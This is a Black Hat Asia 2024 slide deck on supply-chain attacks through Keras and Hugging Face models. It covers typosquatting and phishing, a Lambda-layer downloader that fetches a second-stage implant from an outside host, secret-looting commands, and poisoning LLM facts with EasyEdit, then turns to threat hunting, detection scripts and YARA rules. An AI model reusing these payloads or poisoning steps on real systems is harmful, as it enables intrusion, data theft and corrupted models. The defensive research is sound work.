---
title: "Confused Learning Supply Chain Attacks through Machine Learning Models"
speakers: ["Adrian Wood", "Mary Walker"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2024"
edition: "ASIA"
year: 2024
source_pdf: "BlackHat ASIA 2024-Slides/Adrian Wood & Mary Walker-Confused Learning Supply Chain Attacks through Machine Learning Models.pdf"
pages: 66
sha256: "5a5921b83faa23548f02ac8cf85f137008415e3fd7dc2557e4f4cf18f505ce08"
text_chars: 17565
ocr_pages: 14
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:48:36Z"
---
# Confused Learning Supply Chain Attacks through Machine Learning Models

**Speakers:** Adrian Wood, Mary Walker  
**Conference:** Black Hat ASIA 2024  
**Source:** `BlackHat ASIA 2024-Slides/Adrian Wood & Mary Walker-Confused Learning Supply Chain Attacks through Machine Learning Models.pdf` (66 pages)

## Slide 1

Confused Learning: Supply Chain Attacks through Machine Learning Models

## Slide 2

## Hello!

Mary Walker Mairebear @mairebear

Threat Intelligence Dropbox

Adrian Wood Threlfall @whitehacksec Red Team Dropbox

## Slide 3

## Agenda

**01** Introduction **02** Target Selection Attacker **03** Observations Weaponizing **04** Models

05 Deployment
06 Post Exploitation
07 Threat Research
Defense &
08
Prevention

## Slide 4

**01**

Introduction

Key Concepts

## Slide 5

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
flags.
2023-08-08 22:19:15.293491: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT
WARNING: tensorflow:Compiled the loaded model, but the compiled metrics have yet to be built. “model.compile_metrics* will be empty until y
ou train or evaluate the model.
|
```

## Slide 6

## A lot can go wrong with models

Backdoors

\

Hijacks

Modified prediction algorithms

Models containing malware

… and much more

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A lot can go wrong with models
°
°
fe)
o
Backdoors Hijacks
Modified prediction Models containing malware
algorithms
CO
.. and much more
```

## Slide 7

Malicious models won’t execute themselves

Here’s how we do it for bug bounty and red team operations

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
' "A Malicious models
+. - won't execute themselves
a .-Here’s how we do it for bug bounty and
red team operations
```

## Slide 8

## You need a victim and process

Target Pick a victim

Encourage How will you get them to run it?

Coerce

What’s the bait or trick?

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
You need a victim and process
Target
Pick a victim
Encourage
How will you get them
to run it?
S&S ___+— Coerce
VMILCY
What’s the bait or trick?
```

## Slide 9

## Victimology

#### **Data Scientist**

Stores and retrieves

- datasets

- models

#### **SWE**

Retrieves

- Applications

- Sometimes models

#### **ML Engineer**

Stores and retrieves

- datasets

- models

#### **Ops**

Facilitates pulling and serving all the above into pipelines

## Slide 10

02

Target Selection Prerequisite: Understanding the supply chain

## Slide 11

The ML Pipeline Based on observations in bug bounty _and_ red team

**Proximity** To crown jewels

**Observability** complicated

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The ML Pipeline
Based on observations in bug bounty and red team
_ Proximity
y “Seok Party ML Pipeline
/ tools internal components — =e
\. & Libraries > a \ To crown jewels
| ingestion —+t — > training/ \ 000
L D) (precessin \ tuning Ni \
) oa [analy isis/|
[ns —— \Valiclation yg
dot. NS / oye
(Oper) > | pA Loong — Observability
| Source | pipeline ~— — r \
X _Deps _} a. restricte A 7 . 4
SS — compticate
©
```

## Slide 12

ML Teams **optimize for rapid experimentation**

## Slide 13

But they have **a lot** of data

## Slide 14

Prior knowledge? You don’t need to be a math genius or an ML expert to start to work with Machine Learning Models

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
fae Prior 4
knowledge?
Knowledge? °
to operate a You don't need to be a math genius
C2 or an ML expert to start to work with
Machine Learning Models
```

## Slide 15

## Benefits of targeting ML pipelines

Fast Efficient Looting

Normalized Data access

Code Execution As a service

Persistence

As a service

Proximity To restricted data

Visibility Low Visibility

## Slide 16

**03**

Attacker Observations Features that make this attack easier

## Slide 17

Public Model Repositories i.e. huggingface

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Public Model Repositories
i.e. huggingface
| O-O-O—-O
CS @ huggingface.co
S) HuggingFace | © enti Models Datasets Spaces Docs Solutions Pricing
Models
yai/stable-ditfusion-x1-base-1.0 Tasks Models o
stabilityai/stable-dif: x1-base-0.9
meta-1lana/Llama-2-706
meta-Llama/Llana-2-70b-chat-hf Ce
THUDM/chatgln2-6b
stabilityai/StableBel hd
Datasets penchat /openchat
Open-Orca/Opendrea hd
: 5 Ser viel/ControlNet-vi
Spaces ent! da r ponse/zeroscope.v2_Xl
Hugging °
yai/stablo-ditt
Organizations P 7 ~ falcon-40b-instruct
@ subzero , ston
mit WizardLM/WizardCode B-V1.0
```

## Slide 18

## What I love about Huggingface

**Register**

**Typosquats**

**Stars**

Almost any namespace

Font choices

Easy to pump up ⇩ and ★ numbers

## Slide 19

## Organization Registration

Registering orgs is very easy Organizations can be verified, but nobody seems to care Easily the most effective technique

## Slide 20

## Watering Holes

Invite people Or Wait for them to join

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Watering Holes
O-O—-O—O
Organization Members
Invite people
Or
Wait for them to join
Change role
Remove
Change role
Remove
Change role
Remove
Change role
Remove
```

## Slide 21

## Phishing

user

organization

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Phishing
| O-O—-O—-O
«§ Invite people to
Send invitation
userX is inviting you to join "|erganization” on + Hugging Face
huggingface <website@huggingface.co
ne v
```

## Slide 22

## Why is this appealing?

Reach One to Many Relationship

Detonation Favorable Execution Location

Trust

Abuse relationships and provenance

… and yes, people just give you their data

## Slide 23

**04** Weaponizing Models

Make effective malware in functional models

## Slide 24

ML Models are **not** pure functions

## Slide 25

## Deploying the attack  - creation

#let’s start by making a keras lambda layer for arbitrary expressions **from tensorflow import keras** infusion = lambda x: exec(""" $PAYLOAD  """) or x model = Sequential([ Dense(5, input_shape=(3,), activation='relu'), Dense(2, activation='softmax') layer sizes = [3 5 2]

## Slide 26

## Lambda Layer

From foo import bar #not wasting space on all these infusion = lambda x: exec(""" $PAYLOAD """) or x #this is what exists in our exec() r = requests.get("https://lambda.on.aws/", headers={'X-Plat': sys.platform}) dir = os.path.expanduser('~') file = os.path.join(dir,'.implant.bin') with open(file,'wb') as f: f.write(r.content) exec(base64.b64decode(“”)

_So meta: this visualization is made by a backdoored model doing introspection_

Craft a downloader to fetch Second stage

## Slide 27

## Rest of model

aws.py

**#from prior slide:** exec(base64.b64decode(“”) … **#rest of model code - compiles model using the above inputs. Include your attack as an input.** inputs = keras.Input(shape=(5,)) outputs = keras.layers.Lambda(infusion)(inputs) model = keras.Model(inputs, outputs) model.compile(optimizer="adam", loss="sparse_categorical_crossentropy" ) model.save("model_opendiffusion")

Payload ready!

- Much the same process across model formats.

## Slide 28

## Serving payload

aws.py

**#since this is on Hugging Face, we don’t want poor randoms to execute it, or to make it too easy for threat intelligence to reverse**

fn ip_in_cidr(ip: &IpAddr, cidr: &str) -> bool { let cidr = IpCidr::from_str(cidr).unwrap(); cidr.contains(*ip) #if it's in range, serve implant based on x-plat header Else # Serve em something else!

- Function on AWS: Ensures the malware is only served in scope - Prevents unwanted execution

- - Better opsec

## Slide 29

**05**

Deploying https://5stars217.github.io/ -> ‘Red teaming with ml models’

## Slide 30

## Deploying the attack

So we have working malware Victims in a organization, uploading content and using the repository

Can trivially backdoor and get execution

## Slide 31

## End state - flow

End state

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
End state - flow
Q-O-O-O
C2 Infra
Conditional serving
————————S
3rd Party
tools
& Libraries
pypi.com
Victim environment
&
```

## Slide 32

## Malware execution

End state

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Malware execution
fo
( ssh
tools
\e Libraries , ( ML Pipeline __ Y
ai! : re. code,
ex. huggingface.co
pyei.com INN \
e ML [ ingestion ) Cee. 3 a training/ analysis/ — /.
| Hadille J [processing “(tering validation Sng, =
[i |
Open )
soe © likely malware detonation location \ Compute |
Dees ; 4
OpenAL
```

## Slide 33

**06**

Post Exploitation Attacking MLops Pipelines

## Slide 34

## Goals

**Steal Secrets Poison Models Exfiltrate** Big Data Apps; Abuse access to model Use the big data benefits to Spark, Snowflake etc registry exfiltrate A nmap script for pipelines by @alkaet <u>https://wiki.offsecml.com -> Supply Chain</u> Attacks -> ML Ops Pipelines -> Recon

## Slide 35

## Looting

**#ex, you’re in jupyter:** $> env

**#bet you a dollar you just got a secret**

$> cd /opt # - custom tooling

**#hunt for shared notebook secrets.**

**# surprisingly safe to run**

$> grep -rl '\b'"password *=

A NoteBook Post-Ex Toolkit by @josephtlucas: <u>https://wiki.offsecml.com -> Supply Chain</u> Attacks -> ML Ops Pipelines -> Using Jupyter

- *'[^']*'"

## Slide 36

## Poisoning models

### EasyEdit

An LLM ‘alignment’ tool

Takes the difficult problem of poisoning LLMs and makes it easy

Deployability Drop as a binary, don’t go interactive.

Works over C2!

## Slide 37

## Poisoning models

### Generalized

**## edit descriptor: prompt that you want to edit** prompts = [ 'What is the Capital of Australia?' ] **## You can set `ground_truth` to** None !!!(or set to original output) ground_truth = [‘Canberra'] **## edit target: expected output** target_new = ['Sydney’]

Up to 89% generalization

High Accuracy

On LLAMA 2, up to 100% accuracy

A LLM editor by @zjunlp <u>https://wiki.offsecml.com -> Adversarial Attacks -> Access</u> to Model Registry  -> Modify Ground Truths

## Slide 38

**07** Threat Research

Hunting for malicious models

## Slide 39

## Background & Goals

**Understand prevalence**

**Identify Create & Detections Share Intel**

## Slide 40

## Scope

Outset Midpoint

Final

All the models all the formats all the malware!

Well, all the tensorflow models!

Well, at least all the keras models?

## Slide 41

Considerations for assessment _Isolation_

**_Q:_** _If we think these are filled with malware, how can we be sure to not infect ourselves?_ **A:** Create cloud-based lab environment without employer attribution

## Slide 42

Considerations for assessment _Data Preservation_

**_Q:_** _If we’re analyzing over a thousand models, how can we make sense of the data we get?_ **A:** Store results in a database for long-term retention and asynchronous analysis

## Slide 43

## Assessment Process

Process

**Poll huggingface to find all public models in scope**

###### **Iterate over candidate models:**

- **Grab model or model metadata**

- **Check for Lambda layer**

- **Update Dynamo with intel, including any extracted binary and the model’s update date**

- **If the model is .H5, delete it from disk**

## Slide 44

Scripting **keras_metadata.pb** | protobuf serialization, clearly has an embedded blob in nested dictionaries

src: https://github.com/keras-team/ keras/blob/v3.1.1/keras/utils/python_utils.py

**!!!** This is **easy to parse** , especially when using built-ins from the keras library in Python **!!!**

## Slide 45

## Scripting

code snippets **from tensorflow.python.keras.protobuf.saved_metadata_pb2 import SavedMetadata**

#create an instance of the SavedMetadata class and read our file into it saved_metadata = **SavedMetadata()** saved_metadata. **ParseFromString** ({file}) #these are the keys to look for for a passthrough layer layer **["config"]["function"]** ["items"][0] node.identifier == " **_tf_keras_layer** " layer **["class_name"] == "Lambda"]**

## Slide 46

## Scripting

**{model}.h5** | Tensorflow & Keras also support the use of the .h5 file format to save a pretrained model

H5 is also a very popular format for **model weights**

A normal H5 file representing a pretrained model can be **hundreds of gigabytes** in size

**Inconsistency in model cards** complicates assessing if an .h5 file associated with a repo is a model file or a model weight file

Models saved in .h5 format using the legacy **save_pretrained()** method in keras  are **extremely difficult to assess without loading** them and thereby executing code they might contain

## Slide 47

## Scripting

code snippets

**import h5py** # models saved with .save will contain a "model_config" attribute. Keras documentation encourages this saving method in that this is the most consistent way to embed serialized code if ' **model_config** ' in list(f.attrs.keys()): try: lambda_code = [ layer.get("config", {}).get("function", {}) for layer in json.loads(f.attrs **["model_config"])["config"]** [ "layers" ] if **layer["class_name"] == "Lambda"** ] code = lambda_code[0][0]

## Slide 48

## # Models Assessed (initial round)

11,412 893 403
Total Protobuf h5
Files Assessed keras_metadata.pb {model}.h5

## Slide 49

Since last fall, we have checked an additional **3,264** protobuf serialized keras models for the presence of code

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
. _* Since last fall, we have checked
, : an additional 3,264 protobuf
~ | _* serialized keras models for the
are presence of code
“contains_code": {
"Ss": "True"
},
“modified_date": {
"S": "2022-09-02T02:3:
},
“extracted_encoded_ code": {
"S$": "4wEAAAAAAAAAAQAAAATAAABTAAAACWOAAABGAGOB FACOAFMAKQFOKQL aCXRmYV9pbWFnZdoQZGVu\nc2VFaW1hZ2V
fd2FycCkB2gF4qQByBAAAAPr9L3Vzci9sb2NhbC9nb29nbGUvX2IsYXp1X2ZpdHN1 \nbXJ1ZGEvZThiNDRhMGEWYmQ42j Y3YjAyOThhYTNINzhj
MGU2Y j IvZXh1Y3Jvb3QvZ29vZ2x1My9i \nbGF6ZS1vdxQvazgt Y3VkYTExLW9wdC9i aW4vZ29vZ2xleC9nY2FtL2ZyYW11X21ludGVycG9sYXRp\
nb24vdHJhaWSpbmcvYnVpbGRfc2F2ZWRfbWIkZWx FY 2xpLnJibmZpbGVzL 2dvb2dsZTMvZ29vZ2x1\neCOnY2FtL2ZyYW11X21ludGVycG9sYXRp
b24vbW9kZWxzL2Z1¢21vb1 9uZXQvdXRpbC5wedoIPGxh\nbWIkYTSFAAAABWAAAAA=\n"
,
"model_type": {
“S": “protobuf*
“contains_code": {
“s": "True"
},
“modified_date":
```

## Slide 50

## Threat Hunt Results

Of the initial 1,296 models assessed, **only 54** contained a bespoke code layer. Since then, the incidence has only shrunk: we have only found **24 new** code-bearing models out of more than 3,000 assessed.

## Slide 51

## Interpreting embedded code

#sample dis output: 0 LOAD_CONST               1 (0) 2 LOAD_CONST               0 (None) 4 IMPORT_NAME              0 (os) 6 STORE_FAST               1 (os) 8 LOAD_FAST **1 (os)** 10 LOAD_METHOD **1 (system)** 12 LOAD_CONST **2 ('calc.exe')** 14 CALL_METHOD              1 16 POP_TOP 18 LOAD_FAST                0 (x) 20 RETURN_VALUE hacking for model in code_list: code = code_list[model] try: dis.dis(marshal.loads(codecs.decode(code.encode(‘ascii’), ‘base64’)))

## Slide 52

A model containing a bespoke code layer is **the exception** , not the rule

**Complex code** (more than simple arithmetic manipulation) **is even more rare**

## Slide 53

## Results: Exploit Attempts

**print(‘Malicious code!’)** mkiani/unsafesaved-model **2023-10-18**

opendiffusion/ sentimentcheck **training.bin 2023-07-10**

opendiffusion/ mkiani/unsafeneilalfred93/ sentimentcheck saved-model my_demo **nc listener 2023-07-10 2023-10-18 2024-01-09 2023-09-04 2024-01-05 2024-03-15** MustEr/ mastersplinter/ m0kr4n3/ vgg16_light infected_test model3 **calc.exe curl .dev domain exec poc.py “exploit.py”**

## Slide 54

## Threat Hunt Results

<u>Pickle models n=100 -> contain malware.</u> For <u>keras models containing code layer, only</u> **six** were found that contain attempts to execute code.

Src: jfrog blog.

_security researcher’s model card_

Keras protobuf models on keras are not a hugely poisoned well right now, **but** … **other model formats are even easier to abuse** (e.g. pickles), **other attacks are being developed** (e.g. neuron based attacks), and **there is a growing interest in attacking ML by APTs** (e.g. 29)

## Slide 55

**08**

Defense Tools and strategies for prevention and assessment

## Slide 56

## Environmental Mitigations

Connectivity Do not allow direct unfettered internet access

Filetypes Safetensor model pipelines

Evaluate Evaluate incoming models

## Slide 57

## Introducing: Bhakti Malicious Model Monitoring

- CDK to instantiate monitoring

- ● Analysis scripts

- ● EC2 Launch Templates

- ● YARA rules

<u>github.com/dropbox/bhakti</u>

please contribute & make it actually nice :)

## Slide 58

## Tooling : Modelscan

- From ProtectAI

modelscan -p ${/path/to/file|folder}

- Pytorch, Tensorflow, & Keras model formats supported

- Identifies **embedded Lambda as Medium**

- **Doesn’t extract code**

<u>https:/</u> <u>/github.com/protectai/modelscan</u>

## Slide 59

## YARA & Semgrep

**YARA is perfectly** **able to evaluate both protobuf & .h5 formats**

YARA

rule KerasRequests **.h5 formats** { strings: $function = "function_type" $layer = "lambda" $req = "requests" base64 condition: $req and ($function and $layer) }

**TrailOfBits** has some lovely **semgrep** rules but nothing related to our work: https://github.com/trailofbit s/semgrep-rules/tree/main/ python

## Slide 60

## Detections

##### **ClamAV**

- Max file size: **4gb**

- Not Great at Linux Malware

- ● Doesn’t claim to assess ML formats

“Based on contextual information, it seems that this behavior may be expected due to machine learning training… confirm if the activity referenced above is expected for the user performing training of a ML model on the endpoint”

- EDR vendor

## Slide 61

# Incident responders **must learn** their ML environments

Identify Eradicate Learn
Prepare Contain Recover

**ML expertise is not required**

## Slide 62

Tooling : H5 Visualization From **hdfgroup** Java fat client: <u>https://www.hdfgroup.org/ downloads/hdfview</u>

In-browser: <u>https://myhdf5.hdfgroup.org/</u>

## Slide 63

## Old school methods

Submitting a model to your friendly neighborhood sandbox **will not work**

**Execute the model in a controlled environment** & use behavioral malware analysis techniques

## Slide 64

## Future Work

Where can we go from here?

- YARA and Semgrep – Static analysis in ingestion pipelines

- ● DFIR Tooling

- Improve static analysis at hf, especially for simple formats

- Improve and standardize model cards

- Neuron attacks and other model formats

The appendix contains some current ‘state of the art’ for malicious models.

## Slide 65

**THANK YOU** github.com/ dropbox/bhakti

wiki.offsecml.com All your offensive ML needs

## Slide 66

## Appendix : Current State

What has already been done?

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
What has already been done?
£3 huggingface.co/docs/hub/en/security-pickle
Pickle Scanning
Protect Al has scanned over 400,000 Hugging Face mo
luation, we found 3354 models th:
ce. 1347 of those models are not mark:
The main reason to subclass Layer instead of using a Lambda layer is saving and inspecting a model.
bda layers are saved by serializing the Python bytecode, which is fundamentally non-portable and
potentially unsafe. They should only be loaded in the same environment where they were saved.
Safetensors
sors is a new simple format for storit
that is still fast (zero-copy). S
Welcome to the Offensive ML
Playbook
Latest: 3/22/24 version: 0.9.9
First published 10/26/23.
Unveiling AI/ML Supply Chain
Attacks: Name Squatting
Organizations on Hugging Face
```
